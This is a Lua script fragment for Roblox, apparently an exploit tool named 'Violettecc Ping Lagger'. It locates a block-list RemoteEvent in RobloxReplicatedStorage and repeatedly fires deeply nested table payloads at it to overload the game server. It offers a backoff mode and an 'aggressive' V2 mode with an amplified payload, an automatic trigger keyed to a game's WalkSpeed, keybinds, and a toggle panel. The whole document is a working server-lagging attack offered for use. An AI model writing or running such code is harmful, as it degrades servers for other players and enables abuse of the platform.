-- ══════════════════════════════════════════════════════════════════════
-- PING LAGGER LOGIC
-- ══════════════════════════════════════════════════════════════════════
local function findRemote()
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	if not rrs then return nil end
	local found
	for _, name in ipairs({ "SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList" }) do
		local r = rrs:FindFirstChild(name)
		if r and r:IsA("RemoteEvent") then
			found = r
			break
		end
	end
	if not found then
		for _, c in ipairs(rrs:GetChildren()) do
			if c:IsA("RemoteEvent") and c.Name:find("Block") then
				found = c
				break
			end
		end
	end
	return found
end

remote = findRemote()

local function buildPayload(power, depth, scale)
	depth = depth or 186
	scale = scale or 1.0

	local main = {}
	local nested = { {} }
	local current = nested[1]
	for _ = 1, depth do
		local n = {}
		table.insert(current, n)
		current = n
	end

	local baseRep = math.floor(power / 188)
	local maxRep  = math.floor(baseRep * scale)
	maxRep = math.min(maxRep, math.floor(10000 * scale))
	maxRep = math.max(maxRep, 1)

	for _ = 1, maxRep do
		table.insert(main, nested)
	end
	return main
end

-- ──────────────────────────────────────────────────────────────────────
-- V1: Safer & smoother
--   • Reacts to errors — backs off when a fire fails
--   • Ramps delay downward on success (down to 0.05s) → less delay overall
--   • Works with Auto Brainrot
--   • Payload uses the raw strength scale
-- ──────────────────────────────────────────────────────────────────────
-- V2: Aggressive
--   • No backoff — keeps firing at exactly cfg.interval no matter what
--   • Payload amplified (strength scale × V2 boost)
--   • More delay per cycle, and can lag hard if spammed
-- ──────────────────────────────────────────────────────────────────────
local V2_PAYLOAD_BOOST = 1.35

local function runPingLoop()
	if cfg.mode == "v2" then
		while active and remote do
			local preset = getStrengthPreset()
			local payload = buildPayload(cfg.power, preset.depth, preset.scale * V2_PAYLOAD_BOOST)
			pcall(function()
				remote:FireServer(payload)
			end)
			task.wait(cfg.interval)
		end
	else
		local delay = cfg.interval
		while active and remote do
			local preset = getStrengthPreset()
			local payload = buildPayload(cfg.power, preset.depth, preset.scale)
			local ok = pcall(function()
				remote:FireServer(payload)
			end)
			if not ok then
				delay = math.min(delay * 1.5, 0.5)
			else
				delay = math.max(delay * 0.995, 0.05)
			end
			task.wait(delay)
		end
	end
end

local function flipLag(state, isManual)
	active = state

	if isManual then
		if brainrotMode then
			manualOverride = not state
		else
			manualOverride = false
		end
	end

	if active then
		if not remote then
			remote = findRemote()
			if not remote then
				active = false
				flipLag(false)
				return
			end
		end
		activateBtn.BackgroundColor3 = C.accent
		activateLbl.Text = "ACTIVATED"
		activateLbl.TextColor3 = Color3.fromRGB(0, 0, 0)
		activateStroke.Color = C.white
		activateStroke.Transparency = 0.15
		statusLbl.Text = cfg.mode == "v2" and "ON·V2" or "ON"
		statusLbl.TextColor3 = C.green
		tw(statusPill, { BackgroundColor3 = Color3.fromRGB(16, 36, 22) }, 0.18)
		task.spawn(runPingLoop)
	else
		activateBtn.BackgroundColor3 = C.card
		activateLbl.Text = "ACTIVATE"
		activateLbl.TextColor3 = C.white
		activateStroke.Color = C.accent
		activateStroke.Transparency = 0.45
		statusLbl.Text = "OFF"
		statusLbl.TextColor3 = C.red
		tw(statusPill, { BackgroundColor3 = Color3.fromRGB(22, 14, 28) }, 0.18)
	end
end

activateBtn.MouseButton1Click:Connect(function()
	flipLag(not active, true)
end)

-- Auto Brainrot (only triggers when WalkSpeed is in 10-25 range, same as Hyeju)
local AUTO_MIN_WS = 10
local AUTO_MAX_WS = 25

_conns[#_conns + 1] = RunService.Heartbeat:Connect(function()
	if not panelOpen then return end
	if not cfg.autoBrainrot then
		if brainrotMode then
			brainrotMode = false
			lastBrainrotState = false
		end
		return
	end

	local char = plr.Character
	if not char then return end
	local hum = char:FindFirstChild("Humanoid")
	if not hum then return end

	local ws = hum.WalkSpeed
	local hasBrainrot = ws >= AUTO_MIN_WS and ws <= AUTO_MAX_WS

	if hasBrainrot and not lastBrainrotState then
		brainrotMode = true
		lastBrainrotState = true
		manualOverride = false
		flipLag(true)
	elseif not hasBrainrot and lastBrainrotState then
		brainrotMode = false
		lastBrainrotState = false
		manualOverride = false
		flipLag(false)
	end
end)

-- Input
_conns[#_conns + 1] = UserInputService.InputBegan:Connect(function(input, processed)
	local kc = input.KeyCode
	if kc == Enum.KeyCode.Unknown then return end

	local isGp = isGamepad(kc)
	local isKb = input.UserInputType == Enum.UserInputType.Keyboard

	if listeningFor then
		if kc == Enum.KeyCode.Escape then
			listeningFor = nil
			updateKbLabels()
			return
		end
		if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
			cfg.keybindKb = kc.Name
			listeningFor = nil
			updateKbLabels()
			saveConfig()
			return
		end
		if listeningFor == "gp" and isGp then
			cfg.keybindGp = kc.Name
			listeningFor = nil
			updateKbLabels()
			saveConfig()
			return
		end
		return
	end

	if processed or not panelOpen then return end

	local kbEnum = resolveKb(cfg.keybindKb)
	local gpEnum = resolveKb(cfg.keybindGp)

	if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
		flipLag(not active, true)
	end
end)

updateKbLabels()

-- Open / close API used by the Settings button
local function setOpen(on)
	on = on == true
	if panelOpen == on then return end
	panelOpen = on
	if on then
		mainFrame.Visible = true
	else
		closeSettings()
		if active then flipLag(false) end
		brainrotMode, lastBrainrotState, manualOverride = false, false, false
		mainFrame.Visible = false
	end
end

return {
	Toggle = function() setOpen(not panelOpen); return panelOpen end,
	IsOpen = function() return panelOpen end,
	SetOpen = setOpen,
	Destroy = function()
		if active then active = false end
		for _, c in ipairs(_conns) do pcall(function() c:Disconnect() end) end
		_conns = {}
		pcall(function() screen:Destroy() end)
	end,
}
end)()
_G._VioletteccPingLaggerUIRuntime = _G._VioletteccPingLaggerUI
end)

